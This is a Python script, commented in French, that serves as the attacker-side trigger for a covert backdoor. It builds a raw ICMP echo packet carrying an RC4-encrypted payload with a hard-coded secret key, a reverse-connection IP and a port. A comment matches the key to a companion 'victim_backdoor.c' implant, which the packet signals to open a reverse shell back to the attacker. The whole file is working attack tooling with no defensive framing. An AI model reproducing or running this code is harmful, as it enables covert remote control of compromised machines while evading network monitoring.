#!/usr/bin/env python3
"""
attacker_trigger.py - Envoi d’un paquet ICMP déclencheur chiffré via RC4

Usage:
    sudo ./attacker_trigger.py <target_ip> <reverse_ip> <reverse_port> [secret_key]

Si secret_key n'est pas fourni, il utilise la valeur par défaut.
"""

import socket
import struct
import sys
import os

ICMP_ECHO_REQUEST = 8
DEFAULT_SECRET_KEY = "wA@2mC!dq"  # Doit correspondre à SECRET_KEY dans victim_backdoor.c

def rc4(data: bytes, key: bytes) -> bytes:
    """Implémente RC4 pour chiffrer ou déchiffrer les données."""
    S = list(range(256))
    j = 0
    out = bytearray()
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = 0
    j = 0
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(byte ^ S[(S[i] + S[j]) % 256])
    return bytes(out)

def checksum(source_bytes: bytes) -> int:
    """Calcule le checksum pour le paquet ICMP."""
    count_to = (len(source_bytes) // 2) * 2
    s = 0
    for count in range(0, count_to, 2):
        this_val = source_bytes[count+1] * 256 + source_bytes[count]
        s += this_val
        s &= 0xffffffff
    if count_to < len(source_bytes):
        s += source_bytes[-1]
        s &= 0xffffffff
    s = (s >> 16) + (s & 0xffff)
    s += (s >> 16)
    answer = ~s & 0xffff
    return socket.htons(answer)

def create_icmp_packet(secret_key: str, reverse_ip: str, reverse_port: str) -> bytes:
    """Construit un paquet ICMP contenant le payload déclencheur chiffré par RC4."""
    packet_id = os.getpid() & 0xFFFF
    packet_seq = 1
    payload_str = f"{secret_key} {reverse_ip} {reverse_port}"
    payload = payload_str.encode()
    encrypted_payload = rc4(payload, secret_key.encode())
    header = struct.pack("!BBHHH", ICMP_ECHO_REQUEST, 0, 0, packet_id, packet_seq)
    packet = header + encrypted_payload
    chksum = checksum(packet)
    header = struct.pack("!BBHHH", ICMP_ECHO_REQUEST, 0, chksum, packet_id, packet_seq)
    return header + encrypted_payload

def send_icmp_packet(target_ip: str, packet: bytes):
    """Envoie le paquet ICMP via un socket RAW."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        print("Ce script doit être exécuté en tant qu'administrateur/root.")
        sys.exit(1)
    sock.sendto(packet, (target_ip, 1))
    sock.close()
    print(f"[+] Paquet ICMP envoyé vers {target_ip}")

def usage():
    print(f"Usage: {sys.argv[0]} <target_ip> <reverse_ip> <reverse_port> [secret_key]")
    sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) < 4:
        usage()

    target_ip = sys.argv[1]
    reverse_ip = sys.argv[2]
    reverse_port = sys.argv[3]
    secret_key = sys.argv[4] if len(sys.argv) >= 5 else DEFAULT_SECRET_KEY

    packet = create_icmp_packet(secret_key, reverse_ip, reverse_port)
    send_icmp_packet(target_ip, packet)
